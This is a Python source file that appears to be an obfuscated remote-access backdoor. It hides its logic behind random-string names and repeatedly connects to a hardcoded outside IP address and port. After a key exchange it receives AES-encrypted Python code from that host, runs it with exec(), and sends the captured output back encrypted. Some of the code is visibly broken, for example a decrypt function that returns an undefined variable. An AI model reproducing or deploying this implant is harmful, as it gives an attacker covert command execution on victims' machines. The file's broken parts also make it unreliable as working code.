import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa



egYAzOyVPByAXFog = []
UUGKXokNuTEYlpnW = []

def jiZSLWlzyNIEQQhw(sig, frame):

    for QpkbIGBtxNFiqZbk_socket in egYAzOyVPByAXFog:
        QpkbIGBtxNFiqZbk_socket.close()

    sys.exit(0)

signal.signal(signal.SIGINT, jiZSLWlzyNIEQQhw)

OnKQMtQYboDtCtGn = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

kpDrudNGOUEtCZKy = OnKQMtQYboDtCtGn.encode('utf-8')

owUqUPmoEnHshgqB = serialization.load_pem_public_key(kpDrudNGOUEtCZKy)

def sbhOOJKIccTbcyCs(owUqUPmoEnHshgqB, BIWxZaIJQfXlIXIP):

    beboaqTdApahkgSj= owUqUPmoEnHshgqB.key_size

    uJWuPRjelaOfuRpx = (beboaqTdApahkgSj// 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(BIWxZaIJQfXlIXIP) > uJWuPRjelaOfuRpx:
        sys.exit(0)

    try:
        CpGxqdTcgpApYTel = owUqUPmoEnHshgqB.encrypt(
            BIWxZaIJQfXlIXIP,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        sys.exit(1)

    hFwQNNfTYbFaeWfO = base64.b64encode(CpGxqdTcgpApYTel).decode('utf-8')
    return hFwQNNfTYbFaeWfO


def KmykbRHpcOxKqJoe(QpkbIGBtxNFiqZbk):
    sqCrRkWBejrVIwyP = QpkbIGBtxNFiqZbk.recv(4096)
    sqCrRkWBejrVIwyP = sqCrRkWBejrVIwyP.decode()

    n, g = sqCrRkWBejrVIwyP.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)
    yzjaXgGrJmvuxltg = int(pow(g, x, n))

    yzjaXgGrJmvuxltg = str(yzjaXgGrJmvuxltg)
    QpkbIGBtxNFiqZbk.send(yzjaXgGrJmvuxltg.encode())

    dcFSPGKJqpkJvIbn = QpkbIGBtxNFiqZbk.recv(4096)
    dcFSPGKJqpkJvIbn = int(dcFSPGKJqpkJvIbn.decode())

    zzBNyDrigcjJGfNv = pow(dcFSPGKJqpkJvIbn, x, n)

    yeUqRQBylGraniiu = int.to_bytes(zzBNyDrigcjJGfNv, length=(zzBNyDrigcjJGfNv.bit_length() + 7) // 8, byteorder='big')
    yeUqRQBylGraniiu = hashlib.sha256(yeUqRQBylGraniiu).digest()

    return yeUqRQBylGraniiu


def aQxBeoFbaTfxOAgw(qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF, FiWurRomQeCDggUh, VCchrEErbxNcTmnI):

    if (qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF) in UUGKXokNuTEYlpnW:
        return

    QpkbIGBtxNFiqZbk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    QpkbIGBtxNFiqZbk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    egYAzOyVPByAXFog.append(QpkbIGBtxNFiqZbk)

    try:
        QpkbIGBtxNFiqZbk.connect((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))
        UUGKXokNuTEYlpnW.append((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))
        
        yeUqRQBylGraniiu = KmykbRHpcOxKqJoe(QpkbIGBtxNFiqZbk)

        HmUWtwnTRFHSnBWG = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
        try:
            etzIlpnsHNDDrTyb = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, HmUWtwnTRFHSnBWG.encode())
            QpkbIGBtxNFiqZbk.send(etzIlpnsHNDDrTyb)
        except Exception as e:
            pass

        rVtqyrfrVMjDUmHo = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"

        try:
            rVtqyrfrVMjDUmHo = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, rVtqyrfrVMjDUmHo.encode())
        except Exception as e:
            pass


        while True:

            QpkbIGBtxNFiqZbk.send(rVtqyrfrVMjDUmHo)

            pBpSzPQUuLaogHMl = QpkbIGBtxNFiqZbk.recv(4096)
            try:
                TqFgXPWEcmvrEZux = NGgdlADhpmjHDtzN(yeUqRQBylGraniiu, pBpSzPQUuLaogHMl)
            except Exception as e:
                continue

            GMuxTHNpyamXvINw = sys.stdout
            FGGHZfUMNgqWxFhY = io.StringIO()
            sys.stdout = FGGHZfUMNgqWxFhY

            try:
                exec(TqFgXPWEcmvrEZux)
                EfSyrZtonGqBQjHA = FGGHZfUMNgqWxFhY.getvalue()
                if EfSyrZtonGqBQjHA:
                    print(EfSyrZtonGqBQjHA)
                elif EfSyrZtonGqBQjHA == "":
                    EfSyrZtonGqBQjHA = "empty sqCrRkWBejrVIwyP"
            except Exception as e:
                EfSyrZtonGqBQjHA = e
            finally:
                sys.stdout = GMuxTHNpyamXvINw

            print(EfSyrZtonGqBQjHA)

            xUFNYjeeATjogiUf = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, EfSyrZtonGqBQjHA.encode())
            QpkbIGBtxNFiqZbk.send(xUFNYjeeATjogiUf)

            time.sleep(1)


    except Exception as e:
        pass

    finally:
        if (qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF) in UUGKXokNuTEYlpnW:
            UUGKXokNuTEYlpnW.remove((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))

        QpkbIGBtxNFiqZbk.close()

def cuDxwXGDQbUIWPUu(key, plaintext):
    eLcjrutJWIQrcOny = os.urandom(16)
    eUoVnsJFBtTaamlR = Cipher(algorithms.AES(key), modes.CBC(eLcjrutJWIQrcOny), backend=default_backend())
    iyyBtOnhSnaAKKsp = eUoVnsJFBtTaamlR.encryptor()

    JGdExRMIUjteHNXL = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    EcKmtITtWpuRMEqP = JGdExRMIUjteHNXL.update(plaintext) + JGdExRMIUjteHNXL.finalize()

    eUoVnsJFBtTaamlRtext = iyyBtOnhSnaAKKsp.update(EcKmtITtWpuRMEqP) + iyyBtOnhSnaAKKsp.finalize()
    return eLcjrutJWIQrcOny + eUoVnsJFBtTaamlRtext

def NGgdlADhpmjHDtzN(key, encrypted_message):
    eLcjrutJWIQrcOny = encrypted_message[:16]
    eUoVnsJFBtTaamlRtext = encrypted_message[16:]

    eUoVnsJFBtTaamlR = Cipher(algorithms.AES(key), modes.CBC(eLcjrutJWIQrcOny), backend=default_backend())
    jipzrMDUxBVJZpyp = eUoVnsJFBtTaamlR.decryptor()

    iydiXYefIErdfCoH = jipzrMDUxBVJZpyp.update(eUoVnsJFBtTaamlRtext) + jipzrMDUxBVJZpyp.finalize()

    tOrGFbGwZxSszOrt = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    JQYabUXOMdtpFoFp= tOrGFbGwZxSszOrt.update(iydiXYefIErdfCoH) + tOrGFbGwZxSszOrt.finalize()

    return plaintext.decode('utf-8')


if __name__ == "__main__":

    qrDhhQAoMpzBmXdG = "34.204.78.186"
    BGGOhVEXBldGavZF = int(65500)
    FiWurRomQeCDggUh = private_ip = "127.0.0.1"
    VCchrEErbxNcTmnI = 1239

    while True:
        try:
            aQxBeoFbaTfxOAgw(qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF, FiWurRomQeCDggUh, VCchrEErbxNcTmnI)
        except Exception as e:
            time.sleep(1)
            continue

        time.sleep(5)
